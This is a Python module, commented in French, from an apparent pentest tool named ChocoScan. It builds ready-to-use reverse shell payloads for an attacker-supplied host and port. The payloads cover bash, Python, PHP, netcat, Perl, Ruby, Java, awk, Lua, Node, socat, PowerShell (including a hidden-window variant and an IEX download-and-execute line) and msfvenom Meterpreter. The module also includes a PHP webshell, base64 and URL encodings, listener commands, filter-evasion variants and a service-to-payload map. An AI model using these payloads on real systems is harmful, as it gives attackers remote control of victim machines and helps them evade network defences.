"""
ChocoScan — Reverse Shell Generator.

Génère des payloads reverse shell prêts à l'emploi pour chaque
service vulnérable détecté, avec encodages (base64, URL) et
commandes de listener Netcat associées.

Formats supportés : bash, sh, python3, python2, php, powershell,
netcat, ncat, perl, ruby, java, awk, lua, node, socat, xterm,
msfvenom (Windows/Linux ELF/EXE/asp/aspx/jsp/war).

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
from urllib.parse import quote


@dataclass
class ReverseShell:
    name:        str
    language:    str
    os_target:   str        # linux | windows | any
    payload:     str
    description: str = ""
    b64:         str = ""   # payload encodé base64
    url:         str = ""   # payload URL-encodé
    b64_cmd:     str = ""   # commande complète qui déclenche le b64
    listener:    str = ""   # commande nc/ncat à lancer côté attaquant


# ── Templates de payloads ─────────────────────────────────────────────────────

def _b64_linux(cmd: str) -> str:
    """Encode une commande bash en base64 et retourne la commande de décodage."""
    encoded = base64.b64encode(cmd.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"


def _ps_b64(cmd: str) -> str:
    """Encode une commande PowerShell en UTF-16LE base64."""
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
    return f"powershell -EncodedCommand {encoded}"


def build_shells(lhost: str, lport: int) -> list[ReverseShell]:
    """Construit la liste complète des reverse shells pour LHOST:LPORT."""

    L, P = lhost, lport
    listener_nc    = f"nc -lvnp {P}"
    listener_ncat  = f"ncat -lvnp {P}"
    listener_rl    = f"rlwrap nc -lvnp {P}      # rlwrap pour historique + flèches"
    listener_socat = (f"socat file:`tty`,raw,echo=0 tcp-listen:{P},reuseaddr")

    shells: list[ReverseShell] = []

    # ── Bash ─────────────────────────────────────────────────────────────────
    bash_cmd = f"bash -i >& /dev/tcp/{L}/{P} 0>&1"
    shells.append(ReverseShell(
        name="bash_tcp", language="bash", os_target="linux",
        payload=bash_cmd,
        b64=base64.b64encode(bash_cmd.encode()).decode(),
        b64_cmd=_b64_linux(bash_cmd),
        url=quote(bash_cmd),
        description="Bash TCP redirect — le plus fiable sur Linux",
        listener=listener_rl,
    ))

    bash_196 = f"0<&196;exec 196<>/dev/tcp/{L}/{P}; sh <&196 >&196 2>&196"
    shells.append(ReverseShell(
        name="bash_196", language="bash", os_target="linux",
        payload=bash_196,
        b64_cmd=_b64_linux(bash_196),
        description="Bash /dev/tcp via fd 196 — contourne certains filtres",
        listener=listener_nc,
    ))

    shells.append(ReverseShell(
        name="bash_udp", language="bash", os_target="linux",
        payload=f"sh -i >& /dev/udp/{L}/{P} 0>&1",
        description="Bash UDP — contourne les filtres TCP sortants",
        listener=f"nc -lvnp {P} -u",
    ))

    # ── Python ────────────────────────────────────────────────────────────────
    py3_cmd = (
        f"python3 -c 'import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{L}\",{P}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"pty.spawn(\"/bin/bash\")'"
    )
    shells.append(ReverseShell(
        name="python3_pty", language="python3", os_target="linux",
        payload=py3_cmd,
        b64_cmd=_b64_linux(py3_cmd),
        url=quote(py3_cmd),
        description="Python3 + PTY — donne un shell interactif complet",
        listener=listener_socat,
    ))

    py2_cmd = (
        f"python -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{L}\",{P}));os.dup2(s.fileno(),0);"
        f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
    )
    shells.append(ReverseShell(
        name="python2", language="python2", os_target="linux",
        payload=py2_cmd,
        b64_cmd=_b64_linux(py2_cmd),
        description="Python2 — pour les vieilles machines",
        listener=listener_rl,
    ))

    # ── PHP ───────────────────────────────────────────────────────────────────
    php_cmd = f"php -r '$sock=fsockopen(\"{L}\",{P});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    shells.append(ReverseShell(
        name="php_fsockopen", language="php", os_target="any",
        payload=php_cmd,
        url=quote(php_cmd),
        description="PHP fsockopen — classique sur les serveurs web PHP",
        listener=listener_rl,
    ))

    shells.append(ReverseShell(
        name="php_proc_open", language="php", os_target="any",
        payload=(
            f"php -r '$sock=fsockopen(\"{L}\",{P});"
            f"$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
        ),
        description="PHP proc_open — contourne certains disable_functions",
        listener=listener_nc,
    ))

    shells.append(ReverseShell(
        name="php_webshell", language="php", os_target="any",
        payload="<?php system($_GET['cmd']); ?>",
        description="PHP webshell — upload sur le serveur, puis ?cmd=id",
        listener="",
    ))

    # ── NetCat ────────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="nc_mkfifo", language="netcat", os_target="linux",
        payload=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {L} {P} >/tmp/f",
        description="Netcat mkfifo — fonctionne avec nc sans option -e",
        listener=listener_rl,
    ))
    shells.append(ReverseShell(
        name="nc_e", language="netcat", os_target="linux",
        payload=f"nc -e /bin/sh {L} {P}",
        description="Netcat -e — nécessite la version avec option -e (OpenBSD nc n'a pas -e)",
        listener=listener_nc,
    ))
    shells.append(ReverseShell(
        name="ncat_e", language="ncat", os_target="linux",
        payload=f"ncat {L} {P} -e /bin/bash",
        description="Ncat — toujours disponible sur Kali, supporte -e",
        listener=listener_ncat,
    ))

    # ── Perl ──────────────────────────────────────────────────────────────────
    perl_cmd = (
        f"perl -e 'use Socket;$i=\"{L}\";$p={P};"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    )
    shells.append(ReverseShell(
        name="perl", language="perl", os_target="linux",
        payload=perl_cmd,
        description="Perl — souvent présent sur les vieilles machines",
        listener=listener_rl,
    ))

    # ── Ruby ──────────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="ruby", language="ruby", os_target="linux",
        payload=(
            f"ruby -rsocket -e'"
            f"f=TCPSocket.open(\"{L}\",{P}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        description="Ruby — fréquent sur les machines Rails",
        listener=listener_nc,
    ))

    # ── Java ──────────────────────────────────────────────────────────────────
    java_rt = (
        f"Runtime.getRuntime().exec(new String[]"
        f"{{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{L}/{P} 0>&1\"}})"
    )
    shells.append(ReverseShell(
        name="java_runtime", language="java", os_target="any",
        payload=java_rt,
        url=quote(java_rt),
        description="Java Runtime.exec — injection dans des RCE Java (Struts2, Log4Shell...)",
        listener=listener_nc,
    ))

    # ── Awk ───────────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="awk", language="awk", os_target="linux",
        payload=(
            f"awk 'BEGIN {{s = \"/inet/tcp/0/{L}/{P}\"; "
            f"while(42) {{ do {{ printf \"shell>\" |& s; s |& getline c; "
            f"if(c){{ while ((c |& getline) > 0) print |& s; close(c); }} }} "
            f"while(c != \"exit\") }}}}'"
        ),
        description="Awk — utile quand awk est en SUID ou accessible via sudo",
        listener=listener_nc,
    ))

    # ── Lua ───────────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="lua", language="lua", os_target="linux",
        payload=(
            f"lua -e \"local s=require('socket');"
            f"local t=assert(s.tcp());t:connect('{L}',{P});"
            f"while true do local r,x=t:receive();local f=io.popen(r,'r');"
            f"local b=assert(f:read('*a'));t:send(b);end;f:close();\""
        ),
        description="Lua — moins courant mais disponible sur certaines boxes",
        listener=listener_nc,
    ))

    # ── Node.js ───────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="nodejs", language="node", os_target="any",
        payload=(
            f"node -e \"require('child_process').exec("
            f"'bash -c \\\"bash -i >& /dev/tcp/{L}/{P} 0>&1\\\"')\""
        ),
        description="Node.js — machines avec Express, Electron, etc.",
        listener=listener_rl,
    ))

    # ── Socat ─────────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="socat", language="socat", os_target="linux",
        payload=f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{L}:{P}",
        description="Socat — donne un vrai PTY, le meilleur shell interactif",
        listener=listener_socat,
    ))

    # ── PowerShell ────────────────────────────────────────────────────────────
    ps_raw = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{L}',{P});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String);"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
        f"$client.Close()"
    )
    ps_one = f"powershell -nop -w hidden -c \"{ps_raw}\""
    shells.append(ReverseShell(
        name="powershell", language="powershell", os_target="windows",
        payload=ps_one,
        b64_cmd=_ps_b64(ps_raw),
        description="PowerShell TCP — standard Windows",
        listener=listener_rl,
    ))

    ps_iex = (
        f"powershell -nop -c \"IEX(New-Object Net.WebClient)"
        f".DownloadString('http://{L}/shell.ps1')\""
    )
    shells.append(ReverseShell(
        name="powershell_iex", language="powershell", os_target="windows",
        payload=ps_iex,
        description="PowerShell IEX — télécharge et exécute depuis ton serveur HTTP",
        listener=f"# Héberge ton shell.ps1 : python3 -m http.server 80\n{listener_rl}",
    ))

    # ── msfvenom ─────────────────────────────────────────────────────────────
    shells.append(ReverseShell(
        name="msfvenom_elf", language="msfvenom", os_target="linux",
        payload=(
            f"msfvenom -p linux/x64/meterpreter/reverse_tcp "
            f"LHOST={L} LPORT={P} -f elf -o shell.elf && chmod +x shell.elf"
        ),
        description="msfvenom ELF (Linux x64) — Meterpreter",
        listener=(
            f"msfconsole -q -x 'use multi/handler; "
            f"set payload linux/x64/meterpreter/reverse_tcp; "
            f"set LHOST {L}; set LPORT {P}; run'"
        ),
    ))
    shells.append(ReverseShell(
        name="msfvenom_exe", language="msfvenom", os_target="windows",
        payload=(
            f"msfvenom -p windows/x64/meterpreter/reverse_tcp "
            f"LHOST={L} LPORT={P} -f exe -o shell.exe"
        ),
        description="msfvenom EXE (Windows x64) — Meterpreter",
        listener=(
            f"msfconsole -q -x 'use multi/handler; "
            f"set payload windows/x64/meterpreter/reverse_tcp; "
            f"set LHOST {L}; set LPORT {P}; run'"
        ),
    ))

    # Enrichit les URLs et b64 manquants
    for s in shells:
        if not s.url and s.payload:
            s.url = quote(s.payload)
        if not s.b64 and s.payload:
            s.b64 = base64.b64encode(s.payload.encode()).decode()

    return shells


# ── Sélection par service ─────────────────────────────────────────────────────

_SERVICE_PREF: dict[str, list[str]] = {
    "http":       ["php_fsockopen", "bash_tcp", "python3_pty", "nc_mkfifo"],
    "apache":     ["php_fsockopen", "bash_tcp", "python3_pty"],
    "nginx":      ["php_fsockopen", "bash_tcp", "python3_pty"],
    "iis":        ["powershell", "msfvenom_exe"],
    "tomcat":     ["java_runtime", "bash_tcp", "python3_pty"],
    "jenkins":    ["java_runtime", "bash_tcp", "groovy"],
    "openssh":    ["bash_tcp", "python3_pty", "socat"],
    "ftp":        ["bash_tcp", "python3_pty", "nc_mkfifo"],
    "smb":        ["powershell", "msfvenom_exe"],
    "rdp":        ["powershell", "msfvenom_exe"],
    "mysql":      ["bash_tcp", "python3_pty"],
    "nodejs":     ["nodejs", "bash_tcp"],
    "php":        ["php_fsockopen", "php_proc_open"],
    "python":     ["python3_pty", "bash_tcp"],
    "ruby":       ["ruby", "bash_tcp"],
    "lua":        ["lua", "bash_tcp"],
    "redis":      ["bash_tcp", "python3_pty"],
    "wordpress":  ["php_fsockopen", "php_proc_open", "php_webshell"],
}


def best_shells(service_name: str, lhost: str, lport: int,
                os_target: str = "linux") -> list[ReverseShell]:
    """Retourne les 3 meilleurs shells pour un service donné."""
    all_sh = {s.name: s for s in build_shells(lhost, lport)}
    prefs  = _SERVICE_PREF.get(service_name.lower(), ["bash_tcp", "python3_pty", "nc_mkfifo"])

    result = []
    for name in prefs[:3]:
        if name in all_sh:
            result.append(all_sh[name])

    # Fallback si service inconnu
    if not result:
        fallbacks = (["powershell", "msfvenom_exe"] if os_target == "windows"
                     else ["bash_tcp", "python3_pty", "nc_mkfifo"])
        result = [all_sh[n] for n in fallbacks if n in all_sh]

    return result


def save_all_shells(lhost: str, lport: int, output_path: str,
                     os_target: str = "linux") -> str:
    """Génère un fichier Markdown avec tous les payloads."""
    shells = build_shells(lhost, lport)
    lines  = [
        f"# ChocoScan — Reverse Shells",
        f"# LHOST={lhost}  LPORT={lport}  OS={os_target}",
        f"# Généré le : {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}",
        "",
        f"## Listener",
        f"```bash",
        f"rlwrap nc -lvnp {lport}",
        f"# ou pour PTY complet :",
        f"socat file:`tty`,raw,echo=0 tcp-listen:{lport},reuseaddr",
        f"```",
        "",
    ]
    for sh in shells:
        if os_target != "any" and sh.os_target != "any" and sh.os_target != os_target:
            continue
        lines += [
            f"## {sh.name} ({sh.language})",
            f"*{sh.description}*",
            f"```bash",
            sh.payload,
            f"```",
        ]
        if sh.b64_cmd:
            lines += [f"Base64 :", f"```bash", sh.b64_cmd, f"```"]
        if sh.listener:
            lines += [f"Listener :", f"```bash", sh.listener, f"```"]
        lines.append("")

    content = "\n".join(lines)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(content)
    return output_path
